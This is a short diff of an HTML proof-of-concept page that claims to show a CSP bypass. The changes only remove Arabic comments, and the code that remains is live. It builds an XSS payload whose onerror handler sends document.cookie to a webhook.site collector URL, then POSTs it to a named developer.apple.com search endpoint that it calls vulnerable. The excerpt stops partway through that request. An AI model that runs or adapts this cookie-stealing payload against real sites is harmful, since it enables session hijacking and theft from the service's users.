@@ -9,13 +9,13 @@
   <p>This page demonstrates how a crafted request can lead to CSP bypass.</p>
 
   <script>
-    // Webhook الخاص بك لإثبات التنفيذ
+    // Webhook 
     const webhook = "https://webhook.site/76de3122-9fc0-47d9-844c-1fb847ba7133";
 
-    // نص الـ payload (هنا مجرد مثال بسيط)
+    //  payload 
     const payload = "<img src=x onerror=\"fetch('" + webhook + "?cookie='+document.cookie)\">";
 
-    // إرسال طلب POST إلى endpoint المصاب
+    // Post
     fetch("https://developer.apple.com/search/services/v1/quick-links/", {
       method: "POST",
       headers: {"Content-Type": "application/x-www-form-urlencoded"},
